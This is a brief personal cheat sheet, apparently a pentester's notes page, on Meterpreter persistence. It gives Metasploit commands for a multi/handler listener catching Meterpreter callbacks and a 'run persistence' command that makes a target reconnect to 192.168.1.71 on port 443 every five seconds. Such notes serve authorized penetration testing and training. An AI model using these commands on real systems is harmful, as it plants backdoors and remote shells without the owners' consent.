---
title: "Meterpreter Persistence"
date: 2021-10-09T15:26:00-05:00
draft: false
---

# Multi-Handler
Handle callbacks from Meterpreters

    use exploit/multi/handler
    set payload ...
    set lport 443
    set lhost ...
    set ExitOnSession false
    exploit -j -z


# Persistence Script
[Offensive Security Post on Persistence Script](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/)

Still gotta test this one:
    run persistence -U -i 5 -p 443 -r 192.168.1.71

